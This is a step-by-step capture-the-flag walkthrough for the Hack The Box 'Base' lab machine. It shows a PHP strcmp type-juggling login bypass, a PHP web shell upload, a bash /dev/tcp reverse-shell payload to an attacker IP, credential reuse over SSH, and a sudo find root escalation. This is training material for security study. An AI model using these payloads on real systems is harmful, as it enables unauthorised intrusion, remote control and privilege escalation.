# HTB-BASE

<figure><img src="../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

#### Step 1: Enumeration - Scanning for Open Ports

1. **Objective**: Identify open ports and services on the target machine.
2.  **Action**: Run an Nmap scan to discover open ports and services.

    ```bash
    sudo nmap -sC -sV 10.10.10.48

    ```
3. **Explanation**: The `sC` flag enables default scripts for additional enumeration, and `sV` identifies service versions. The document mentions port 22 (SSH) is open, along with port 80 (HTTP), indicating a web server and potential SSH access.

#### Step 2: Web Enumeration - Exploring the Web Server

1. **Objective**: Investigate the web server running on port 80.
2. **Action**: Visit `http://10.10.10.48` in your browser.
3. **Findings**: The website is a file hosting service with a navigation bar containing links like Home, About, Services, Team, Pricing, Contact, and a **Login** button.
4. **Next Step**: Click the **Login** button to access the login page at `http://10.10.10.48/login/login.php`.

#### Step 3: Directory Enumeration - Discovering Listable Directories

1. **Objective**: Find hidden directories or files on the web server.
2. **Action**: Check the `/login` directory by visiting `http://10.10.10.48/login/`.
3. **Findings**: The `/login` directory is listable and contains:
   * `config.php`
   * `login.php`
   * `login.php.swp` (a Vim swap file)
4. **Explanation**: The `.swp` file is a temporary file created by Vim, often containing unsaved changes. Since it’s not a `.php` file, the web server serves it as raw text instead of executing it.

#### Step 4: Analyzing the Swap File

1. **Objective**: Extract readable content from `login.php.swp` to understand the login mechanism.
2. **Action**:
   * Download `login.php.swp` by clicking the link in the `/login` directory.
   *   Use the `strings` command to extract human-readable text:

       ```bash
       strings login.php.swp > file.txt

       ```
   *   Reverse the output to make it readable using `tac`:

       ```bash
       tac file.txt

       ```
3.  **Findings**: The reversed output reveals the PHP code for `login.php`:

    ```php
    <?php
    session_start();
    if (!empty($_POST['username']) && !empty($_POST['password'])) {
        require('config.php');
        if (strcmp($username, $_POST['username']) == 0) {
            if (strcmp($password, $_POST['password']) == 0) {
                $_SESSION['user_id'] = 1;
                header("Location: /upload.php");
            } else {
                print("<script>alert('Wrong Username or Password')</script>");
            }
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    }
    ?>

    ```
4. **Explanation**: The login script checks the submitted username and password against variables in `config.php` using `strcmp`. If both match (`strcmp` returns 0), the user is redirected to `/upload.php`.

#### Step 5: Exploiting the Type Juggling Vulnerability

1. **Objective**: Bypass the login authentication due to a PHP type juggling bug.
2. **Vulnerability**: The `strcmp` function is insecure. If an empty array is passed (e.g., `username[]`), `strcmp` returns `NULL`, which PHP’s loose comparison (`==`) evaluates as equal to `0`, allowing login bypass.
3. **Action**:
   * Set up Burp Suite to intercept HTTP requests. Configure your browser to use Burp as a proxy (e.g., via FoxyProxy).
   * Go to `http://10.10.10.48/login/login.php`, enter random credentials (e.g., `admin`/`pass`), and submit the login form.
   *   In Burp Suite, intercept the POST request:

       ```
       POST /login/login.php HTTP/1.1
       Host: 10.10.10.48
       Content-Type: application/x-www-form-urlencoded
       Content-Length: 32
       ...
       username=admin&password=pass

       ```
   *   Modify the POST data to convert inputs to arrays:

       ```
       username[]=admin&password[]=pass

       ```
   * Forward the modified request in Burp Suite.
4. **Result**: The login succeeds, redirecting to `/upload.php`, which provides file upload functionality.

#### Step 6: Gaining a Foothold - Uploading a PHP File

1. **Objective**: Test if the server allows PHP file uploads and code execution.
2. **Action**:
   *   Create a test PHP file to verify code execution:

       ```bash
       echo "<?php phpinfo(); ?>" > test.php

       ```
   * On the `/upload.php` page, upload `test.php`.
   *   Use Gobuster to find where uploaded files are stored:

       ```bash
       gobuster dir --url <http://10.10.10.48/> --wordlist /usr/share/wordlists/dirb/big.txt

       ```
3. **Findings**: Gobuster reveals a listable directory `/_uploaded` containing `test.php`.
4. **Action**: Visit `http://10.10.10.48/_uploaded/test.php` to confirm PHP execution (it displays PHP configuration info via `phpinfo()`).

#### Step 7: Establishing a Web Shell

1. **Objective**: Upload a PHP web shell for command execution.
2. **Action**:
   *   Create a file named `webshell.php`:

       ```bash
       echo "<?php echo system(\\\\$_REQUEST['cmd']); ?>" > webshell.php

       ```
   * Upload `webshell.php` via the `/upload.php` page.
   * Visit `http://10.10.10.48/_uploaded/webshell.php?cmd=id` to test command execution.
3. **Result**: The server executes the `id` command, confirming the web server runs as the `www-data` user.

#### Step 8: Obtaining a Reverse Shell

1. **Objective**: Gain an interactive shell on the target.
2. **Action**:
   *   Set up a Netcat listener on your machine (replace `443` with your chosen port):

       ```bash
       sudo nc -lvnp 443

       ```
   * In Burp Suite, intercept a request to `webshell.php` and convert it to a POST request (right-click, select “Change request method”).
   *   Add the following reverse shell payload as the `cmd` parameter, replacing `10.10.14.38` with your IP and `443` with your listening port:

       ```
       cmd=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.38/443 0>&1'

       ```
   *   URL-encode the payload in Burp Suite (select the payload and press `Ctrl+U`):

       ```
       cmd=/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.38/443+0>%261'

       ```
   *   Send the modified POST request:

       ```
       POST /_uploaded/webshell.php HTTP/1.1
       Host: 10.10.10.48
       Content-Type: application/x-www-form-urlencoded
       Content-Length: 59
       ...
       cmd=/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.38/443+0>%261'

       ```
3. **Result**: Your Netcat listener receives a reverse shell as the `www-data` user.

#### Step 9: Lateral Movement - Finding Credentials

1. **Objective**: Find credentials to access another user account.
2. **Action**:
   *   In the reverse shell, check the `config.php` file:

       ```bash
       cat /var/www/html/login/config.php

       ```
3.  **Findings**: The file contains:

    ```php
    <?php
    $username = "admin";
    $password = "thisisagoodpassword";
    ?>

    ```
4.  **Action**: Check for system users:

    ```bash
    ls /home

    ```

    * This reveals a user named `john`.
5.  **Action**: Since port 22 (SSH) is open, attempt to log in as `john` using the password `thisisagoodpassword`:

    ```bash
    ssh john@10.10.10.48

    ```

    * Enter the password when prompted.
6. **Result**: SSH login succeeds, and you find the user flag at `/home/john/user.txt`.

#### Step 10: Privilege Escalation - Gaining Root Access

1. **Objective**: Escalate privileges to root.
2.  **Action**: Check the user’s sudo privileges:

    ```bash
    sudo -l

    ```

    * Enter the password `thisisagoodpassword`.
3. **Findings**: The user `john` can run the `find` command as root without a password.
4.  **Action**: Exploit the `find` command to spawn a root shell:

    ```bash
    sudo find . -exec /bin/bash \\\\; -quit

    ```
5. **Explanation**: The `exec` flag runs a command (in this case, `/bin/bash`) as root, and `quit` stops after the first execution.
6.  **Result**: You obtain a root shell. Verify with:

    ```bash
    whoami && id

    ```

    * Output confirms you are `root` (`uid=0(root)`).
7.  **Action**: Retrieve the root flag:

    ```bash
    cat /root/root.txt

    ```

***

#### Summary of Steps

1. **Scan the target** using Nmap to identify open ports (22, 80).
2. **Enumerate the web server** and discover the listable `/login` directory containing `login.php.swp`.
3. **Analyze the swap file** using `strings` and `tac` to reveal the login script’s code.
4. **Exploit the type juggling vulnerability** in `strcmp` by sending `username[]=admin&password[]=pass` via Burp Suite to bypass login.
5. **Upload a test PHP file** (`test.php`) to confirm PHP execution.
6. **Upload a web shell** (`webshell.php`) to execute system commands.
7. **Obtain a reverse shell** by sending a URL-encoded bash payload via a POST request.
8. **Find credentials** in `config.php` (`admin`/`thisisagoodpassword`).
9. **Perform lateral movement** by using the credentials to SSH as the user `john`.
10. **Escalate privileges** by exploiting `sudo find` to gain a root shell and retrieve the root flag.

***

#### Tools Required

* **Nmap**: For port scanning.
* **Burp Suite**: For intercepting and modifying HTTP requests.
* **Gobuster**: For directory brute-forcing.
* **Netcat**: For setting up a reverse shell listener.
* **SSH Client**: For logging in as the user `john`.
* **Text Editor**: To create PHP files (`test.php`, `webshell.php`).
* **Linux Commands**: `strings`, `tac`, `cat`, `ls`, `sudo`.

***

#### Notes

* Replace `10.10.14.38` with your actual IP address when setting up the reverse shell.
* Ensure your Netcat listener is running before sending the reverse shell payload.
* If the `find` command syntax fails, verify the exact path to `bash` (e.g., `/bin/bash`).
* Always URL-encode payloads in Burp Suite to avoid server misinterpretation.

Congratulations! You’ve successfully completed the Base machine by gaining root access and retrieving both the user and root flags.
